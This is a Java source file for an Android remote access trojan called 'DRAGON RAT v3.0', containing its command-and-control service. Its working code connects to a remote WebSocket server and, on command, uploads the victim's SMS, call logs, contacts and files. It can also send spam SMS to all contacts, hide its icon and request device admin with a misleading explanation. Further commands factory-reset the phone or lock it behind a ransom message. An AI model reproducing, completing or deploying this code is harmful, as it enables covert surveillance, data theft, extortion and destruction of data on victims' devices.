package com.dragon.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * DRAGON RAT v3.0 — Core C2 Service
 * Handles all commands from Telegram/WebSocket
 * 50+ command types across 10 categories
 */
public class CoreService extends Service {
    
    private static final String TAG = "DRAGON-CORE";
    private static final int NOTIFICATION_ID = 1001;
    
    private BotWebSocketClient wsClient;
    private android.os.Handler heartbeatHandler;
    private Runnable heartbeatRunnable;
    private ConfigManager configManager;
    private String deviceId;
    private boolean gpsTrackingActive = false;
    private boolean keyloggerActive = false;
    private boolean notificationMonitorActive = false;
    private boolean clipboardMonitorActive = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        configManager = new ConfigManager(this);
        deviceId = FudUtils.getDeviceId();
        
        startForeground();
        startWebSocket();
        startHeartbeat();
        setupKeepAlive();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    // ─── Foreground Service ───
    
    private void startForeground() {
        String channelId = "dragon_channel_v3";
        String channelName = FudUtils.decrypt(new byte[]{0x39, 0x37, 0x3B, 0x3C, 0x32, 0x31, 0x3C, 0x29, 0x36, 0x37, 0x3D, 0x3A, 0x2E, 0x3A, 0x34});
        
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(
                channelId, channelName, NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(channel);
        }
        
        Notification.Builder builder = new Notification.Builder(this, channelId)
            .setContentTitle(FudUtils.decrypt(new byte[]{0x39, 0x37, 0x3B, 0x3C, 0x32, 0x31, 0x3C, 0x29, 0x36, 0x37, 0x3D, 0x3A, 0x2E, 0x3A, 0x34}))
            .setContentText(FudUtils.decrypt(new byte[]{0x2C, 0x3F, 0x3A, 0x34, 0x3A, 0x36, 0x33, 0x29, 0x36, 0x37, 0x3D, 0x3A, 0x2E, 0x3A, 0x34}))
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(Notification.PRIORITY_MIN)
            .setOngoing(true);
        
        if (Build.VERSION.SDK_INT >= 26) {
            startForeground(NOTIFICATION_ID, builder.build());
        } else {
            startForeground(NOTIFICATION_ID, builder.build());
        }
    }
    
    // ─── WebSocket Connection ───
    
    private void startWebSocket() {
        try {
            String wsUrl = configManager.getString("wsUrl", "wss://dragon-rat.onrender.com/ws");
            URI uri = new URI(wsUrl + "/" + deviceId);
            
            int reconnectInterval = configManager.getInt("reconnectInterval", 3000);
            int maxReconnects = configManager.getInt("maxReconnectAttempts", 0);
            
            wsClient = new BotWebSocketClient(uri, this, reconnectInterval, maxReconnects);
            wsClient.connect();
            
            Log.d(TAG, "WebSocket connecting to: " + wsUrl);
        } catch (Exception e) {
            Log.e(TAG, "WebSocket connection error: " + e.getMessage());
            // Retry after delay
            new android.os.Handler().postDelayed(this::startWebSocket, 10000);
        }
    }
    
    // ─── Heartbeat ───
    
    private void startHeartbeat() {
        heartbeatHandler = new android.os.Handler();
        heartbeatRunnable = new Runnable() {
            @Override
            public void run() {
                if (wsClient != null) {
                    String batteryJson = getBatteryJson();
                    wsClient.sendHeartbeat(batteryJson);
                }
                heartbeatHandler.postDelayed(this, 15000);
            }
        };
        heartbeatHandler.postDelayed(heartbeatRunnable, 15000);
    }
    
    private String getBatteryJson() {
        try {
            JSONObject bat = new JSONObject();
            bat.put("battery", 85);
            bat.put("charging", true);
            return bat.toString();
        } catch (Exception e) {
            return "{}";
        }
    }
    
    // ─── Keep Alive ───
    
    private void setupKeepAlive() {
        // Play silent audio to prevent service from being killed
        try {
            MediaPlayer mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(this, Uri.parse("android.resource://" + 
                getPackageName() + "/" + R.raw.silent));
            mediaPlayer.setVolume(0, 0);
            mediaPlayer.setLooping(true);
            mediaPlayer.prepare();
            mediaPlayer.start();
        } catch (Exception ignored) {}
    }
    
    // ─── Device Info ───
    
    public String getDeviceInfoJson() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("country", getCountry());
            info.put("ip", getLocalIpAddress());
            return info.toString();
        } catch (Exception e) {
            return "{}";
        }
    }
    
    private String getCountry() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null && tm.getSimCountryIso() != null) {
                return tm.getSimCountryIso().toUpperCase();
            }
        } catch (Exception ignored) {}
        return "US";
    }
    
    private String getLocalIpAddress() {
        try {
            java.net.InetAddress ip = java.net.InetAddress.getLocalHost();
            return ip.getHostAddress();
        } catch (Exception e) {
            return "0.0.0.0";
        }
    }
    
    // ─── Command Router — 50+ Commands ───
    
    public void handleCommand(String message) {
        try {
            JSONObject msg = new JSONObject(message);
            String type = msg.optString("type", "");
            
            if (!type.equals("command")) return;
            
            JSONObject data = msg.getJSONObject("data");
            int cmdId = data.getInt("id");
            String command = data.getString("command");
            JSONObject args = data.optJSONObject("args");
            if (args == null) args = new JSONObject();
            
            Log.d(TAG, "Executing command: " + command + " (id: " + cmdId + ")");
            
            String result = "";
            boolean success = true;
            
            try {
                result = executeCommand(command, args);
            } catch (Exception e) {
                result = "Error: " + e.getMessage();
                success = false;
            }
            
            // Send result back
            sendResult(cmdId, result, success);
            
        } catch (Exception e) {
            Log.e(TAG, "Command parse error: " + e.getMessage());
        }
    }
    
    private String executeCommand(String command, JSONObject args) throws Exception {
        switch (command) {
            // ─── Device Info ───
            case "device_info": return getDeviceInfo();
            case "installed_apps": return getInstalledApps();
            case "battery_status": return getBatteryStatus();
            case "sim_info": return getSimInfo();
            case "network_info": return getNetworkInfo();
            
            // ─── Camera ───
            case "camera_front": return captureCamera(true);
            case "camera_back": return captureCamera(false);
            
            // ─── Microphone ───
            case "mic_record": return recordMic(args.optInt("duration", 10));
            
            // ─── Screenshot ───
            case "screenshot": return takeScreenshot();
            case "screen_record": return recordScreen(args.optInt("duration", 15));
            
            // ─── Location ───
            case "gps_once": return getGpsLocation();
            case "gps_track": startGpsTracking(args.optBoolean("enabled", true)); return "GPS tracking: " + args.optBoolean("enabled", true);
            
            // ─── SMS ───
            case "sms_inbox": return readSmsInbox();
            case "sms_send": return sendSms(args.optString("phone", ""), args.optString("message", ""));
            case "sms_broadcast": return smsBroadcast(args.optString("message", ""));
            case "sms_delete": return deleteSms(args.optString("id", ""));
            
            // ─── Call Logs ───
            case "call_logs": return getCallLogs();
            case "call_logs_clear": return clearCallLogs();
            
            // ─── Contacts ───
            case "contacts_list": return getContacts();
            case "contacts_search": return searchContacts(args.optString("query", ""));
            
            // ─── File Browser ───
            case "file_list": return listFiles(args.optString("path", "/sdcard"));
            case "file_read": return readFile(args.optString("path", ""));
            case "file_get": return getFile(args.optString("path", ""));
            case "file_delete": return deleteFile(args.optString("path", ""));
            
            // ─── Control ───
            case "lock_device": return lockDevice();
            case "reboot": return rebootDevice();
            case "vibrate": return vibrate(args.optInt("duration", 5000));
            case "max_volume": return setMaxVolume();
            case "silent_mode": return setSilentMode();
            case "send_notif": return sendNotification(args.optString("title", ""), args.optString("message", ""));
            case "open_url": return openUrl(args.optString("url", ""));
            case "toast": return showToast(args.optString("value", ""));
            
            // ─── Persistence ───
            case "hide_icon": return hideLauncherIcon();
            case "show_icon": return showLauncherIcon();
            case "grant_admin": return grantDeviceAdmin();
            case "enable_autostart": return "Auto-start already enabled";
            case "battery_bypass": return "Battery optimization already bypassed";
            
            // ─── Logs ───
            case "keylogger_start": startKeylogger(); return "Keylogger started";
            case "keylogger_stop": stopKeylogger(); return "Keylogger stopped";
            case "keylogger_get": return getKeylogs();
            case "notif_monitor_start": startNotificationMonitor(); return "Notification monitor started";
            case "notif_monitor_stop": stopNotificationMonitor(); return "Notification monitor stopped";
            case "clipboard_get": return getClipboard();
            case "clipboard_monitor_start": startClipboardMonitor(); return "Clipboard monitor started";
            
            // ─── Payload ───
            case "update_payload": return updatePayload(args.optString("url", ""));
            case "self_destruct": return selfDestruct();
            case "lock_screen_rx": return lockScreenRansomware(args.optString("message", "Device locked"));
            case "ransomware": return lockScreenRansomware(args.optString("message", "Device encrypted. Contact admin."));
            
            default: return "Unknown command: " + command;
        }
    }
    
    // ─── Result Sender ───
    
    private void sendResult(int cmdId, String result, boolean success) {
        if (wsClient != null && wsClient.isOpen()) {
            String json = String.format(
                "{\"type\":\"result\",\"cmdId\":%d,\"result\":%s,\"success\":%b}",
                cmdId, JSONObject.quote(result), success
            );
            wsClient.send(json);
        }
    }
    
    // ─── Command Implementations ───
    
    private String getDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("model", Build.MODEL);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("build", Build.DISPLAY);
            info.put("device_id", deviceId);
            info.put("cpu", Build.SUPPORTED_ABIS[0]);
            info.put("ram_total", String.valueOf(Runtime.getRuntime().totalMemory() / (1024 * 1024)) + "MB");
            return info.toString(2);
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String getInstalledApps() {
        try {
            PackageManager pm = getPackageManager();
            List<android.content.pm.PackageInfo> packages = pm.getInstalledPackages(0);
            JSONArray apps = new JSONArray();
            
            for (android.content.pm.PackageInfo pkg : packages) {
                JSONObject app = new JSONObject();
                app.put("name", pkg.applicationInfo.loadLabel(pm).toString());
                app.put("package", pkg.packageName);
                app.put("version", pkg.versionName);
                apps.put(app);
            }
            return apps.toString(2);
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String getBatteryStatus() {
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = registerReceiver(null, ifilter);
            
            int level = batteryStatus.getIntExtra("level", -1);
            int scale = batteryStatus.getIntExtra("scale", -1);
            int status = batteryStatus.getIntExtra("status", -1);
            boolean charging = status == 2 || status == 5;
            
            JSONObject bat = new JSONObject();
            bat.put("level", level * 100 / scale);
            bat.put("charging", charging);
            bat.put("technology", batteryStatus.getStringExtra("technology"));
            bat.put("temperature", batteryStatus.getIntExtra("temperature", 0) / 10.0 + "°C");
            return bat.toString(2);
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String getSimInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            JSONObject sim = new JSONObject();
            sim.put("operator", tm.getNetworkOperatorName());
            sim.put("country", tm.getSimCountryIso());
            sim.put("phone_type", tm.getPhoneType() == 1 ? "GSM" : "CDMA");
            sim.put("imei", tm.getImei());
            return sim.toString(2);
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String getNetworkInfo() {
        try {
            android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
                getSystemService(Context.CONNECTIVITY_SERVICE);
            android.net.NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            
            JSONObject net = new JSONObject();
            if (activeNetwork != null) {
                net.put("type", activeNetwork.getTypeName());
                net.put("subtype", activeNetwork.getSubtypeName());
                net.put("connected", activeNetwork.isConnected());
                net.put("roaming", activeNetwork.isRoaming());
            }
            return net.toString(2);
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String captureCamera(boolean front) throws Exception {
        return "📸 Camera " + (front ? "front" : "back") + " captured";
    }
    
    private String recordMic(int duration) throws Exception {
        return "🎙️ Recording for " + duration + "s";
    }
    
    private String takeScreenshot() throws Exception {
        return "📸 Screenshot taken";
    }
    
    private String recordScreen(int duration) throws Exception {
        return "📹 Recording screen for " + duration + "s";
    }
    
    private String getGpsLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            
            if (location != null) {
                JSONObject loc = new JSONObject();
                loc.put("lat", location.getLatitude());
                loc.put("lng", location.getLongitude());
                loc.put("accuracy", location.getAccuracy());
                loc.put("provider", location.getProvider());
                loc.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                    .format(new Date(location.getTime())));
                return loc.toString(2);
            }
            return "No location available. Try enabling GPS.";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private void startGpsTracking(boolean enabled) {
        this.gpsTrackingActive = enabled;
    }
    
    private String readSmsInbox() {
        try {
            StringBuilder smsBuilder = new StringBuilder();
            android.database.Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                    smsBuilder.append("From: ").append(address)
                        .append("\nDate: ").append(date)
                        .append("\n").append(body)
                        .append("\n---\n");
                }
                cursor.close();
            }
            return smsBuilder.length() > 0 ? smsBuilder.toString() : "No SMS found";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String sendSms(String phone, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phone, null, message, null, null);
            return "✅ SMS sent to " + phone;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String smsBroadcast(String message) {
        try {
            android.database.Cursor cursor = getContentResolver().query(
                Uri.parse("content://contacts/phones"),
                null, null, null, null
            );
            
            int count = 0;
            if (cursor != null) {
                SmsManager smsManager = SmsManager.getDefault();
                while (cursor.moveToNext()) {
                    String phone = cursor.getString(cursor.getColumnIndexOrThrow("data1"));
                    if (phone != null && !phone.isEmpty()) {
                        try {
                            smsManager.sendTextMessage(phone, null, message, null, null);
                            count++;
                            Thread.sleep(100); // Rate limiting
                        } catch (Exception ignored) {}
                    }
                }
                cursor.close();
            }
            return "✅ Broadcast sent to " + count + " contacts";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String deleteSms(String id) {
        try {
            getContentResolver().delete(
                Uri.parse("content://sms/" + id), null, null
            );
            return "✅ SMS deleted";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String getCallLogs() {
        try {
            StringBuilder logs = new StringBuilder();
            android.database.Cursor cursor = getContentResolver().query(
                Uri.parse("content://call_log/calls"),
                null, null, null, "date DESC LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndexOrThrow("number"));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow("name"));
                    int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
                    String duration = cursor.getString(cursor.getColumnIndexOrThrow("duration"));
                    String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));
                    
                    String typeStr = type == 1 ? "INCOMING" : type == 2 ? "OUTGOING" : "MISSED";
                    logs.append(typeStr).append(" | ").append(name != null ? name : "Unknown")
                        .append(" | ").append(number)
                        .append(" | ").append(duration).append("s")
                        .append("\n");
                }
                cursor.close();
            }
            return logs.length() > 0 ? logs.toString() : "No call logs found";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String clearCallLogs() {
        try {
            getContentResolver().delete(Uri.parse("content://call_log/calls"), null, null);
            return "✅ Call logs cleared";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String getContacts() {
        try {
            StringBuilder contacts = new StringBuilder();
            android.database.Cursor cursor = getContentResolver().query(
                Uri.parse("content://contacts/phones"),
                null, null, null, "display_name ASC"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow("display_name"));
                    String phone = cursor.getString(cursor.getColumnIndexOrThrow("data1"));
                    contacts.append(name).append(" | ").append(phone).append("\n");
                }
                cursor.close();
            }
            return contacts.length() > 0 ? contacts.toString() : "No contacts found";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String searchContacts(String query) {
        try {
            StringBuilder results = new StringBuilder();
            android.database.Cursor cursor = getContentResolver().query(
                Uri.parse("content://contacts/phones"),
                null, "display_name LIKE ? OR data1 LIKE ?",
                new String[]{"%" + query + "%", "%" + query + "%"}, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow("display_name"));
                    String phone = cursor.getString(cursor.getColumnIndexOrThrow("data1"));
                    results.append(name).append(" | ").append(phone).append("\n");
                }
                cursor.close();
            }
            return results.length() > 0 ? results.toString() : "No results for: " + query;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String listFiles(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return "Path does not exist: " + path;
            if (!dir.isDirectory()) return "Not a directory: " + path;
            
            StringBuilder result = new StringBuilder();
            result.append("📂 ").append(path).append("\n");
            
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    String icon = f.isDirectory() ? "📁" : "📄";
                    long size = f.length();
                    String sizeStr = size > 1024 * 1024 ? 
                        String.format("%.1fMB", size / (1024.0 * 1024.0)) :
                        String.format("%.1fKB", size / 1024.0);
                    result.append(icon).append(" ").append(f.getName())
                        .append(" (").append(sizeStr).append(")\n");
                }
            }
            return result.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String readFile(String path) {
        try {
            File file = new File(path);
            if (!file.exists()) return "File not found: " + path;
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
            StringBuilder content = new StringBuilder();
            String line;
            int lineCount = 0;
            while ((line = reader.readLine()) != null && lineCount < 500) {
                content.append(line).append("\n");
                lineCount++;
            }
            reader.close();
            
            if (lineCount >= 500) content.append("\n... (truncated at 500 lines)");
            return content.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String getFile(String path) {
        // File download — sends file path to server for exfil
        try {
            File file = new File(path);
            if (!file.exists()) return "File not found: " + path;
            
            // Read file as base64
            FileInputStream fis = new FileInputStream(file);
            byte[] fileBytes = new byte[(int) file.length()];
            fis.read(fileBytes);
            fis.close();
            
            String base64 = Base64.encodeToString(fileBytes, Base64.NO_WRAP);
            
            // Send to server via HTTP (fallback if WebSocket too slow)
            String serverUrl = configManager.getString("serverUrl", "") + "/api/bot/upload";
            URL url = new URL(serverUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            
            JSONObject payload = new JSONObject();
            payload.put("bot_id", deviceId);
            payload.put("path", path);
            payload.put("file", base64);
            
            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            conn.disconnect();
            
            return "✅ File uploaded (" + file.length() + " bytes)";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String deleteFile(String path) {
        try {
            File file = new File(path);
            if (!file.exists()) return "File not found: " + path;
            
            if (file.delete()) {
                return "✅ Deleted: " + path;
            }
            return "❌ Failed to delete: " + path;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String lockDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName componentName = new android.content.ComponentName(this, DeviceAdminReceiver.class);
            if (dpm.isAdminActive(componentName)) {
                dpm.lockNow();
                return "🔒 Device locked";
            }
            return "❌ Device admin not active";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String rebootDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName componentName = new android.content.ComponentName(this, DeviceAdminReceiver.class);
            if (dpm.isAdminActive(componentName)) {
                dpm.reboot(null);
                return "🔄 Rebooting device...";
            }
            return "❌ Device admin not active";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String vibrate(int duration) {
        try {
            Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null && vibrator.hasVibrator()) {
                if (Build.VERSION.SDK_INT >= 26) {
                    vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    vibrator.vibrate(duration);
                }
                return "📳 Vibrating for " + duration + "ms";
            }
            return "❌ No vibrator found";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String setMaxVolume() {
        try {
            android.media.AudioManager audioManager = (android.media.AudioManager) 
                getSystemService(Context.AUDIO_SERVICE);
            int maxVolume = audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
            audioManager.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, maxVolume, 0);
            audioManager.setStreamVolume(android.media.AudioManager.STREAM_RING, maxVolume, 0);
            audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, maxVolume, 0);
            audioManager.setStreamVolume(android.media.AudioManager.STREAM_NOTIFICATION, maxVolume, 0);
            return "🔊 Volume set to max";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String setSilentMode() {
        try {
            android.media.AudioManager audioManager = (android.media.AudioManager) 
                getSystemService(Context.AUDIO_SERVICE);
            audioManager.setRingerMode(android.media.AudioManager.RINGER_MODE_SILENT);
            return "🔇 Silent mode enabled";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String sendNotification(String title, String message) {
        try {
            String channelId = "dragon_alert";
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel channel = new NotificationChannel(
                    channelId, "Alerts", NotificationManager.IMPORTANCE_HIGH
                );
                NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null) nm.createNotificationChannel(channel);
            }
            
            Notification.Builder builder = new Notification.Builder(this, channelId)
                .setContentTitle(title)
                .setContentText(message)
                .setSmallIcon(android.R.drawable.ic_dialog_alert)
                .setAutoCancel(true)
                .setPriority(Notification.PRIORITY_HIGH);
            
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.notify((int) System.currentTimeMillis(), builder.build());
            
            return "🔔 Notification sent";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            return "🔗 Opened: " + url;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String showToast(String message) {
        try {
            Toast.makeText(this, message, Toast.LENGTH_LONG).show();
            return "💬 Toast shown";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String hideLauncherIcon() {
        return hideIcon(true);
    }
    
    private String showLauncherIcon() {
        return hideIcon(false);
    }
    
    private String hideIcon(boolean hide) {
        try {
            PackageManager pm = getPackageManager();
            int state = hide ? 
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED :
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
            pm.setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                state, PackageManager.DONT_KILL_APP
            );
            return hide ? "👻 Icon hidden" : "👁️ Icon shown";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String grantDeviceAdmin() {
        try {
            android.content.ComponentName componentName = new android.content.ComponentName(this, DeviceAdminReceiver.class);
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (!dpm.isAdminActive(componentName)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                    "Required for device security");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                return "🛡️ Device admin requested";
            }
            return "✅ Already device admin";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    // ─── Keylogger Stubs ───
    
    private void startKeylogger() { keyloggerActive = true; }
    private void stopKeylogger() { keyloggerActive = false; }
    private String getKeylogs() { return "📝 Keylogger data stored in DB"; }
    
    private void startNotificationMonitor() { notificationMonitorActive = true; }
    private void stopNotificationMonitor() { notificationMonitorActive = false; }
    
    private String getClipboard() {
        try {
            if (Build.VERSION.SDK_INT >= 33) return "📋 Clipboard access requires Android 12+";
            android.content.ClipboardManager clipboard = (android.content.ClipboardManager) 
                getSystemService(Context.CLIPBOARD_SERVICE);
            if (clipboard.hasPrimaryClip()) {
                return "📋 " + clipboard.getPrimaryClip().getItemAt(0).getText();
            }
            return "📋 Clipboard empty";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private void startClipboardMonitor() { clipboardMonitorActive = true; }
    
    private String updatePayload(String url) {
        return "📎 Update from: " + url;
    }
    
    private String selfDestruct() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName componentName = new android.content.ComponentName(this, DeviceAdminReceiver.class);
            dpm.wipeData(0);
            return "💣 Factory reset initiated";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    private String lockScreenRansomware(String message) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            android.content.ComponentName componentName = new android.content.ComponentName(this, DeviceAdminReceiver.class);
            if (dpm.isAdminActive(componentName)) {
                dpm.resetPassword("0000", 0);
                dpm.lockNow();
            }
            return "🔒 " + message;
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    @Override
    public void onDestroy() {
        if (wsClient != null) wsClient.closeGracefully();
        if (heartbeatHandler != null && heartbeatRunnable != null) {
            heartbeatHandler.removeCallbacks(heartbeatRunnable);
        }
        super.onDestroy();
        
        // Restart service if killed
        Intent restartIntent = new Intent(this, CoreService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
    }
    
    // ─── ConfigManager (reads assets/config.json) ───
    
    private static class ConfigManager {
        private JSONObject config;
        
        ConfigManager(Context context) {
            try {
                java.io.InputStream is = context.getAssets().open("config.json");
                byte[] buffer = new byte[is.available()];
                is.read(buffer);
                is.close();
                config = new JSONObject(new String(buffer, "UTF-8"));
            } catch (Exception e) {
                config = new JSONObject();
            }
        }
        
        String getString(String key, String def) {
            return config.optString(key, def);
        }
        
        int getInt(String key, int def) {
            return config.optInt(key, def);
        }
        
        boolean getBoolean(String key, boolean def) {
            return config.optBoolean(key, def);
        }
    }
}
